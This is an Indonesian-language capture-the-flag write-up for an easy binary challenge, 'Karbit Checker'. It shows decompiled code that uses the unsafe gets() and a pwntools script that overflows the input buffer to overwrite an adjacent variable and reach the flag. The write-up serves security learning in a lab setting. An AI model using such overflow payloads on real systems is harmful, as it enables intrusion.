# Karbit Checker
**Author:** BbayuGt

**Difficulty:** easy

---
## Description
yang karbit karbit ajah

## Info
```
ncat bitkarbit.ctf.forestylab.com 5000 --ssl
```

## Enumeration
dikasih bin... ketika dibuka menggunakan ghidra terdapat funsi main() dan get_flag()
```

undefined8 main(void)

{
  int iVar1;
  char local_68 [64];
  char local_28 [32];
  
  local_28[0] = '\0';
  local_28[1] = '\0';
  local_28[2] = '\0';
  local_28[3] = '\0';
  local_28[4] = '\0';
  local_28[5] = '\0';
  local_28[6] = '\0';
  local_28[7] = '\0';
  local_28[8] = '\0';
  local_28[9] = '\0';
  local_28[10] = '\0';
  local_28[0xb] = '\0';
  local_28[0xc] = '\0';
  local_28[0xd] = '\0';
  local_28[0xe] = '\0';
  local_28[0xf] = '\0';
  local_28[0x10] = '\0';
  local_28[0x11] = '\0';
  local_28[0x12] = '\0';
  local_28[0x13] = '\0';
  local_28[0x14] = '\0';
  local_28[0x15] = '\0';
  local_28[0x16] = '\0';
  local_28[0x17] = '\0';
  local_28[0x18] = '\0';
  local_28[0x19] = '\0';
  local_28[0x1a] = '\0';
  local_28[0x1b] = '\0';
  local_28[0x1c] = '\0';
  local_28[0x1d] = '\0';
  local_28[0x1e] = '\0';
  local_28[0x1f] = '\0';
  printf("Karbit checker!\nWaifu: ");
  fflush(stdout);
  gets(local_68);
  iVar1 = strncmp(local_68,"Waguri",6);
  if (iVar1 == 0) {
    iVar1 = strcmp(local_28,"bete bat gw ada karbit");
    if (iVar1 == 0) {
      puts("Bit karbit");
      give_flag();
    }
    else {
      puts("Kurang karbitan");
    }
  }
  else {
    puts("Waifu mu jelek mas");
  }
  return 0;
```

dalam main terdapat 3 variable 1 int dan 2 char dengan panjang berbeda. kemudian main juga memastikan bahwa nilai dari variable" itu "bersih"

main juga meminta input dan membandingkan `strncmp` bahwa 6 char pertama adalah `Waguri`

kemudian juga ada pengecekan apakah `bete bat gw ada karbit`

yang kemudian jika kondisi"nya true maka akan memanggil `give_flag()`

problemnya adalah kita cuman input 1x jadinya kita tidak bisa meng-assign local_28

karena kita cuman input 1x, kita harus memaksa local_28 terisi dengan string target "bete bat gw ada karbit" menggunakan satu-satunya input yang kita punya dengan buffer overflow melalui gets(local_68).

sya meminta Ai untuk membuat payloadnya


```python
from pwn import *

p = remote('bitkarbit.ctf.forestylab.com', 5000, ssl=True)
payload = b"Waguri"

payload += b"A" * 58

payload += b"bete bat gw ada karbit"

log.info(f"Payload (total {len(payload)} bytes):\n{hexdump(payload)}")

p.sendline(payload)

log.success("Payload terkirim! Masuk ke mode interaktif...")
p.interactive()

```

## Flag 
```
FORESTY{woi karbit_42b075ae85655cc75ea3de0802945d3b223c7a9d4a03a4ec901899e257f471d2}
```
